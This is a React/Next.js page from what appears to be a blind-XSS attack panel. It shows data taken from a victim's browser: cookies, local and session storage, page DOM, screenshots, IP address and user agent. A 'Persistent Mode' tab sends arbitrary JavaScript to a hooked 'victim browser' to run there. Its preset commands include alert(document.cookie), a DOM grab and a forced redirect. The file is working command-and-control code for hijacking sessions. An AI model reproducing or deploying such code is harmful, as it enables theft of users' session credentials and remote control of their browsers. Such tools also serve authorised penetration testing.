'use client';

import { useEffect, useState, useCallback, useMemo } from 'react';
import { useParams, useRouter } from 'next/navigation';
import Link from 'next/link';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';
import {
    ArrowLeft,
    Loader2,
    Globe,
    Clock,
    Monitor,
    MapPin,
    Cookie,
    Database,
    FileCode,
    Image as ImageIcon,
    Copy,
    Check,
    Wifi,
    WifiOff,
    Send,
    Terminal,
    ExternalLink,
    Wand2,
    FileText,
    Shield,
    ShieldOff
} from 'lucide-react';
import { cn } from '@/lib/utils';
import { useSettings } from '@/lib/settings-context';

type TabType = 'storage' | 'dom' | 'persist';

interface ReportData {
    id: string;
    report_id: string;
    dom: string | null;
    screenshot: string | null;
    screenshot_storage: string | null;
    localstorage: string | null;
    sessionstorage: string | null;
}

interface FullReport {
    id: string;
    uri: string | null;
    origin: string | null;
    referer: string | null;
    user_agent: string | null;
    ip: string | null;
    triggered_at: string;
    cookies: string | null;
    data?: ReportData | null;
}

interface SessionStatus {
    connected: boolean;
    lastSeen?: string;
    diffSeconds?: number;
    lastResponse?: string | null;
    lastResponseAt?: string | null;
    encrypted?: boolean;
}

export default function ReportDetailPage() {
    const params = useParams();
    const router = useRouter();
    const { formatDateTime } = useSettings();
    const [report, setReport] = useState<FullReport | null>(null);
    const [loading, setLoading] = useState(true);
    const [copied, setCopied] = useState<string | null>(null);
    const [activeTab, setActiveTab] = useState<TabType>('storage');

    // Persist state
    const [sessionStatus, setSessionStatus] = useState<SessionStatus | null>(null);
    const [command, setCommand] = useState('');
    const [sending, setSending] = useState(false);
    const [cmdResult, setCmdResult] = useState<{ success: boolean; message: string } | null>(null);

    const checkSessionStatus = useCallback(async () => {
        if (!params.id) return;
        try {
            const res = await fetch(`/api/persist?report_id=${params.id}`);
            if (res.ok) {
                const data = await res.json();
                setSessionStatus(data);
            }
        } catch (error) {
            console.error('Failed to check session:', error);
        }
    }, [params.id]);

    useEffect(() => {
        const fetchReport = async () => {
            try {
                const res = await fetch(`/api/reports/${params.id}`);
                if (res.ok) {
                    const data = await res.json();
                    setReport(data.report);
                } else if (res.status === 404) {
                    router.push('/reports');
                }
            } finally {
                setLoading(false);
            }
        };
        fetchReport();
        checkSessionStatus();

        // Poll session status every 5 seconds
        const interval = setInterval(checkSessionStatus, 5000);
        return () => clearInterval(interval);
    }, [params.id, router, checkSessionStatus]);

    const copyToClipboard = async (text: string, key: string) => {
        await navigator.clipboard.writeText(text);
        setCopied(key);
        setTimeout(() => setCopied(null), 2000);
    };

    const formatJson = (str: string | null) => {
        if (!str) return null;
        try {
            return JSON.stringify(JSON.parse(str), null, 2);
        } catch {
            return str;
        }
    };

    // Beautify HTML with proper indentation
    const beautifyHtml = (html: string): string => {
        let formatted = '';
        let indent = 0;
        const tab = '  ';
        
        // Simple tokenizer
        const tokens = html.replace(/>\s*</g, '>\n<').split('\n');
        
        tokens.forEach(token => {
            token = token.trim();
            if (!token) return;
            
            // Check if it's a closing tag
            if (token.match(/^<\/\w/)) {
                indent = Math.max(0, indent - 1);
            }
            
            formatted += tab.repeat(indent) + token + '\n';
            
            // Check if it's an opening tag (not self-closing, not closing)
            if (token.match(/^<\w[^>]*[^\/]>$/) && !token.match(/^<(br|hr|img|input|meta|link)/i)) {
                indent++;
            }
        });
        
        return formatted.trim();
    };

    const [isBeautified, setIsBeautified] = useState(true);
    
    const processedDom = useMemo(() => {
        if (!report?.data?.dom) return '';
        return isBeautified ? beautifyHtml(report.data.dom) : report.data.dom;
    }, [report?.data?.dom, isBeautified]);

    const sendCommand = async () => {
        if (!command || !params.id) return;

        setSending(true);
        setCmdResult(null);

        try {
            const res = await fetch('/api/persist', {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ report_id: params.id, command }),
            });

            const data = await res.json();

            if (res.ok) {
                setCmdResult({ success: true, message: 'Command sent! Will execute on next poll.' });
                setCommand('');
            } else {
                setCmdResult({ success: false, message: data.error || 'Failed to send command' });
            }
        } catch {
            setCmdResult({ success: false, message: 'Network error' });
        } finally {
            setSending(false);
        }
    };

    const presetCommands = [
        { name: 'Alert', cmd: 'alert("XSS")' },
        { name: 'Cookies', cmd: 'alert(document.cookie)' },
        { name: 'Grab DOM', cmd: 'document.documentElement.outerHTML' },
        { name: 'Get URL', cmd: 'window.location.href' },
        { name: 'Get Title', cmd: 'document.title' },
        { name: 'Redirect', cmd: 'location.href="https://example.com"' },
    ];

    // Helper to get screenshot URL - all requests go through API for security
    const getScreenshotUrl = (screenshot: string, storage: string | null): string => {
        // If data URL, use directly
        if (screenshot.startsWith('data:')) {
            return screenshot;
        }
        // If stored in object storage (s3), route through API with storage hint
        if (storage === 's3') {
            // Extract filename from URL or path
            const filename = screenshot.includes('/') 
                ? screenshot.split('/').pop() 
                : screenshot;
            return `/api/screenshots/${filename}?storage=s3`;
        }
        // If local storage path, use API route
        if (screenshot.startsWith('/screenshots/')) {
            const filename = screenshot.replace('/screenshots/', '');
            return `/api/screenshots/${filename}`;
        }
        // Legacy base64
        return `data:image/png;base64,${screenshot}`;
    };

    const openScreenshotFullscreen = () => {
        if (report?.data?.screenshot) {
            const imgSrc = getScreenshotUrl(report.data.screenshot, report.data.screenshot_storage);
            window.open(imgSrc, '_blank');
        }
    };

    if (loading) {
        return (
            <div className="flex items-center justify-center h-64">
                <Loader2 className="w-8 h-8 animate-spin text-emerald-500" />
            </div>
        );
    }

    if (!report) {
        return (
            <div className="text-center py-12">
                <p className="text-muted-foreground">Report not found</p>
            </div>
        );
    }

    const tabs = [
        { id: 'storage' as TabType, label: 'Storage', icon: Database, show: !!(report.cookies || report.data?.localstorage || report.data?.sessionstorage) },
        { id: 'dom' as TabType, label: 'DOM', icon: FileCode, show: !!report.data?.dom },
        { id: 'persist' as TabType, label: 'Persistent Mode', icon: Terminal, show: true },
    ].filter(t => t.show);

    const detailItems = [
        { icon: Globe, label: 'Origin', value: report.origin },
        { icon: Globe, label: 'Full URL', value: report.uri },
        { icon: Globe, label: 'Referer', value: report.referer },
        { icon: Clock, label: 'Triggered', value: formatDateTime(report.triggered_at) },
        { icon: MapPin, label: 'IP Address', value: report.ip },
        { icon: Monitor, label: 'User Agent', value: report.user_agent },
    ];

    return (
        <div className="space-y-4 animate-fade-in max-w-7xl mx-auto pb-10">
            {/* Header */}
            <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                    <Link
                        href="/reports"
                        className="p-2 rounded hover:bg-[#18181c] text-muted-foreground hover:text-white transition-colors"
                    >
                        <ArrowLeft className="w-5 h-5" />
                    </Link>
                    <div>
                        <h1 className="text-2xl font-bold text-white">{report.origin || 'Unknown'}</h1>
                        <p className="text-muted-foreground text-sm truncate max-w-lg">
                            {report.uri || 'No URI'}
                        </p>
                    </div>
                </div>

                {/* Connection Status */}
                <div className={cn(
                    "flex items-center gap-2 px-3 py-1.5 rounded text-sm",
                    sessionStatus?.connected
                        ? 'bg-emerald-500/20 border border-emerald-500/30'
                        : 'bg-[#18181c] border border-[#27272a]'
                )}>
                    {sessionStatus?.connected ? (
                        <>
                            <Wifi className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                            <span className="text-emerald-400 font-medium">Connected</span>
                        </>
                    ) : (
                        <>
                            <WifiOff className="w-3.5 h-3.5 text-muted-foreground" />
                            <span className="text-muted-foreground">Disconnected</span>
                        </>
                    )}
                </div>
            </div>

            {/* Top Section: Details + Screenshot */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                {/* Details Card */}
                <div className="bg-[#18181c] rounded-lg border border-[#27272a] overflow-hidden">
                    <div className="px-4 py-3 border-b border-[#27272a]">
                        <h3 className="text-sm font-medium text-white">Report Details</h3>
                    </div>
                    <div className="divide-y divide-[#27272a]">
                        {detailItems.map((item) => {
                            const Icon = item.icon;
                            return (
                                <div key={item.label} className="px-4 py-2.5 flex items-start gap-3">
                                    <div className="p-1.5 rounded bg-[#27272a]">
                                        <Icon className="w-3.5 h-3.5 text-muted-foreground" />
                                    </div>
                                    <div className="flex-1 min-w-0">
                                        <p className="text-xs text-muted-foreground">{item.label}</p>
                                        <p className="text-white text-xs mt-0.5 break-all truncate font-mono">{item.value || 'N/A'}</p>
                                    </div>
                                    {item.value && (
                                        <button
                                            onClick={() => copyToClipboard(item.value!, item.label)}
                                            className="p-1.5 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors"
                                        >
                                            {copied === item.label ? (
                                                <Check className="w-3.5 h-3.5 text-emerald-400" />
                                            ) : (
                                                <Copy className="w-3.5 h-3.5" />
                                            )}
                                        </button>
                                    )}
                                </div>
                            );
                        })}
                    </div>
                </div>

                {/* Screenshot Card */}
                <div className="bg-[#18181c] rounded-lg border border-[#27272a] overflow-hidden">
                    <div className="px-4 py-3 border-b border-[#27272a] flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            <ImageIcon className="w-4 h-4 text-muted-foreground" />
                            <h3 className="text-sm font-medium text-white">Screenshot</h3>
                        </div>
                        {report.data?.screenshot && (
                            <button
                                onClick={openScreenshotFullscreen}
                                className="flex items-center gap-1.5 px-2 py-1 rounded text-xs text-muted-foreground hover:text-white hover:bg-[#27272a] transition-colors"
                            >
                                <ExternalLink className="w-3.5 h-3.5" />
                                Open Full
                            </button>
                        )}
                    </div>
                    <div className="p-4">
                        {report.data?.screenshot ? (
                            <div 
                                className="rounded border border-[#27272a] bg-[#09090b] overflow-hidden cursor-pointer hover:border-[#3f3f46] transition-colors"
                                onClick={openScreenshotFullscreen}
                            >
                                <img
                                    src={getScreenshotUrl(report.data.screenshot, report.data.screenshot_storage)}
                                    alt="Page screenshot"
                                    className="w-full h-auto max-h-[300px] object-contain"
                                />
                            </div>
                        ) : (
                            <div className="flex flex-col items-center justify-center py-12 text-muted-foreground">
                                <ImageIcon className="w-10 h-10 mb-2 opacity-30" />
                                <p className="text-sm">No screenshot available</p>
                            </div>
                        )}
                    </div>
                </div>
            </div>

            {/* Tabs Section */}
            {tabs.length > 0 && (
                <>
                    <div className="flex space-x-0.5 rounded bg-[#18181c] p-0.5 w-fit border border-[#27272a]">
                        {tabs.map((tab) => {
                            const Icon = tab.icon;
                            return (
                                <button
                                    key={tab.id}
                                    onClick={() => setActiveTab(tab.id)}
                                    className={cn(
                                        "flex items-center gap-1.5 px-3 py-1.5 rounded text-sm font-medium transition-all",
                                        activeTab === tab.id
                                            ? "bg-[#27272a] text-white shadow-sm"
                                            : "text-muted-foreground hover:text-white"
                                    )}
                                >
                                    <Icon className="w-4 h-4" />
                                    {tab.label}
                                    {tab.id === 'persist' && sessionStatus?.connected && (
                                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                                    )}
                                </button>
                            );
                        })}
                    </div>

                    {/* Tab Content */}
                    <div className="bg-[#18181c] rounded-lg border border-[#27272a] overflow-hidden">
                        {/* Storage Tab */}
                        {activeTab === 'storage' && (
                            <div className="p-4 space-y-4">
                                {report.cookies && (
                                    <div>
                                        <div className="flex items-center gap-1.5 mb-2">
                                            <Cookie className="w-4 h-4 text-orange-400" />
                                            <h3 className="font-medium text-white text-sm">Cookies</h3>
                                        </div>
                                        <pre className="p-3 rounded bg-[#09090b] text-sm text-emerald-400 font-mono overflow-x-auto whitespace-pre-wrap break-all max-h-40">
                                            {report.cookies}
                                        </pre>
                                    </div>
                                )}
                                {report.data?.localstorage && (
                                    <div>
                                        <div className="flex items-center gap-1.5 mb-2">
                                            <Database className="w-4 h-4 text-blue-400" />
                                            <h3 className="font-medium text-white text-sm">LocalStorage</h3>
                                        </div>
                                        <pre className="p-3 rounded bg-[#09090b] text-sm text-emerald-400 font-mono overflow-x-auto max-h-40">
                                            {formatJson(report.data.localstorage)}
                                        </pre>
                                    </div>
                                )}
                                {report.data?.sessionstorage && (
                                    <div>
                                        <div className="flex items-center gap-1.5 mb-2">
                                            <Database className="w-4 h-4 text-purple-400" />
                                            <h3 className="font-medium text-white text-sm">SessionStorage</h3>
                                        </div>
                                        <pre className="p-3 rounded bg-[#09090b] text-sm text-emerald-400 font-mono overflow-x-auto max-h-40">
                                            {formatJson(report.data.sessionstorage)}
                                        </pre>
                                    </div>
                                )}
                                {!report.cookies && !report.data?.localstorage && !report.data?.sessionstorage && (
                                    <div className="py-8 text-center text-muted-foreground text-sm">
                                        No storage data available
                                    </div>
                                )}
                            </div>
                        )}

                        {/* DOM Tab */}
                        {activeTab === 'dom' && report.data?.dom && (
                            <div className="p-4">
                                <div className="flex items-center justify-between mb-2">
                                    <div className="flex items-center gap-1.5">
                                        <FileCode className="w-4 h-4 text-cyan-400" />
                                        <h3 className="font-medium text-white text-sm">DOM HTML</h3>
                                        <span className="text-xs px-1.5 py-0.5 rounded bg-cyan-500/20 text-cyan-400">
                                            {(report.data.dom.length / 1024).toFixed(1)} KB
                                        </span>
                                    </div>
                                    <div className="flex items-center gap-1">
                                        <button
                                            onClick={() => setIsBeautified(!isBeautified)}
                                            className={cn(
                                                "flex items-center gap-1.5 px-2.5 py-1 rounded text-xs transition-colors",
                                                isBeautified 
                                                    ? "bg-cyan-500/20 text-cyan-400" 
                                                    : "bg-[#27272a] text-muted-foreground hover:text-white"
                                            )}
                                        >
                                            <Wand2 className="w-3.5 h-3.5" />
                                            Beautify
                                        </button>
                                        <button
                                            onClick={() => copyToClipboard(processedDom, 'dom')}
                                            className="p-1.5 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors"
                                        >
                                            {copied === 'dom' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                                        </button>
                                    </div>
                                </div>
                                <div className="rounded overflow-hidden border border-[#27272a]">
                                    <SyntaxHighlighter
                                        language="html"
                                        style={vscDarkPlus}
                                        showLineNumbers
                                        wrapLongLines
                                        customStyle={{
                                            margin: 0,
                                            padding: '12px',
                                            fontSize: '13px',
                                            maxHeight: '400px',
                                            background: '#09090b',
                                        }}
                                        lineNumberStyle={{
                                            minWidth: '40px',
                                            paddingRight: '16px',
                                            color: '#525252',
                                            borderRight: '1px solid #27272a',
                                            marginRight: '12px',
                                        }}
                                    >
                                        {processedDom}
                                    </SyntaxHighlighter>
                                </div>
                            </div>
                        )}

                        {/* Persist Tab */}
                        {activeTab === 'persist' && (
                            <div className="p-4 space-y-4">
                                {/* Connection Status */}
                                <div className={cn(
                                    "p-3 rounded flex items-center justify-between",
                                    sessionStatus?.connected
                                        ? 'bg-emerald-500/10 border border-emerald-500/20'
                                        : 'bg-[#09090b] border border-[#27272a]'
                                )}>
                                    <div className="flex items-center gap-3">
                                        {sessionStatus?.connected ? (
                                            <>
                                                <Wifi className="w-4 h-4 text-emerald-400 animate-pulse" />
                                                <div>
                                                    <p className="text-emerald-400 font-medium text-sm">Session Active</p>
                                                    <p className="text-emerald-400/70 text-xs">Last seen {sessionStatus.diffSeconds}s ago</p>
                                                </div>
                                            </>
                                        ) : (
                                            <>
                                                <WifiOff className="w-4 h-4 text-muted-foreground" />
                                                <div>
                                                    <p className="text-muted-foreground font-medium text-sm">No Active Session</p>
                                                    <p className="text-muted-foreground text-xs">
                                                        {sessionStatus?.lastSeen
                                                            ? `Last seen ${sessionStatus.diffSeconds}s ago`
                                                            : 'Victim browser has not connected'}
                                                    </p>
                                                </div>
                                            </>
                                        )}
                                    </div>
                                    {/* Encryption Badge */}
                                    <div className={cn(
                                        "flex items-center gap-1.5 px-2 py-1 rounded text-xs",
                                        sessionStatus?.encrypted
                                            ? 'bg-emerald-500/10 text-emerald-400'
                                            : 'bg-amber-500/10 text-amber-400'
                                    )}>
                                        {sessionStatus?.encrypted ? (
                                            <>
                                                <Shield className="w-3.5 h-3.5" />
                                                <span>AES-256 Encrypted</span>
                                            </>
                                        ) : (
                                            <>
                                                <ShieldOff className="w-3.5 h-3.5" />
                                                <span>Unencrypted</span>
                                            </>
                                        )}
                                    </div>
                                </div>

                                {/* Command Input */}
                                <div>
                                    <label className="block text-sm font-medium text-muted-foreground mb-1.5">
                                        JavaScript Command
                                    </label>
                                    <textarea
                                        value={command}
                                        onChange={(e) => setCommand(e.target.value)}
                                        placeholder={sessionStatus?.connected ? 'alert("XSS")' : 'Session not connected...'}
                                        disabled={!sessionStatus?.connected}
                                        rows={2}
                                        className="w-full px-3 py-2 rounded bg-[#09090b] border border-[#27272a] text-white placeholder-muted-foreground focus:outline-none focus:ring-1 focus:ring-emerald-500/50 font-mono text-sm resize-none disabled:opacity-50"
                                    />
                                </div>

                                {/* Quick Commands */}
                                <div className="flex flex-wrap gap-1.5">
                                    {presetCommands.map((preset) => (
                                        <button
                                            key={preset.name}
                                            onClick={() => setCommand(preset.cmd)}
                                            disabled={!sessionStatus?.connected}
                                            className="px-2.5 py-1 text-xs rounded bg-[#27272a] text-muted-foreground hover:text-white transition-colors disabled:opacity-50"
                                        >
                                            {preset.name}
                                        </button>
                                    ))}
                                </div>

                                {/* Result */}
                                {cmdResult && (
                                    <div className={cn(
                                        "p-3 rounded text-sm",
                                        cmdResult.success 
                                            ? 'bg-emerald-500/10 border border-emerald-500/20 text-emerald-400' 
                                            : 'bg-red-500/10 border border-red-500/20 text-red-400'
                                    )}>
                                        {cmdResult.message}
                                    </div>
                                )}

                                {/* Send Button */}
                                <button
                                    onClick={sendCommand}
                                    disabled={sending || !command || !sessionStatus?.connected}
                                    className="w-full flex items-center justify-center gap-2 px-4 py-2.5 rounded bg-emerald-500 hover:bg-emerald-600 text-white text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                                >
                                    {sending ? (
                                        <Loader2 className="w-4 h-4 animate-spin" />
                                    ) : (
                                        <>
                                            <Send className="w-4 h-4" />
                                            Send Command
                                        </>
                                    )}
                                </button>

                                {/* Response Output */}
                                <div className="mt-4">
                                    <div className="flex items-center justify-between mb-2">
                                        <div className="flex items-center gap-1.5">
                                            <FileText className="w-4 h-4 text-cyan-400" />
                                            <h3 className="font-medium text-white text-sm">Command Response</h3>
                                            {sessionStatus?.lastResponse && (
                                                <span className="text-xs px-1.5 py-0.5 rounded bg-cyan-500/20 text-cyan-400">
                                                    {(sessionStatus.lastResponse.length / 1024).toFixed(1)} KB
                                                </span>
                                            )}
                                        </div>
                                        {sessionStatus?.lastResponse && (
                                            <div className="flex items-center gap-1">
                                                <span className="text-xs text-muted-foreground">
                                                    {sessionStatus.lastResponseAt && formatDateTime(sessionStatus.lastResponseAt)}
                                                </span>
                                                <button
                                                    onClick={() => copyToClipboard(sessionStatus.lastResponse || '', 'response')}
                                                    className="p-1.5 rounded hover:bg-[#27272a] text-muted-foreground hover:text-white transition-colors"
                                                    title="Copy response"
                                                >
                                                    {copied === 'response' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                                                </button>
                                            </div>
                                        )}
                                    </div>
                                    <div className="rounded border border-[#27272a] bg-[#09090b] overflow-hidden">
                                        {sessionStatus?.lastResponse ? (
                                            <pre className="p-3 text-sm text-emerald-400 font-mono overflow-x-auto whitespace-pre-wrap break-all max-h-[300px] overflow-y-auto">
                                                {sessionStatus.lastResponse}
                                            </pre>
                                        ) : (
                                            <div className="p-6 text-center text-muted-foreground text-sm">
                                                <FileText className="w-8 h-8 mx-auto mb-2 opacity-30" />
                                                <p>No response yet</p>
                                                <p className="text-xs mt-1">Send a command that returns a value to see the response here</p>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>
                </>
            )}
        </div>
    );
}
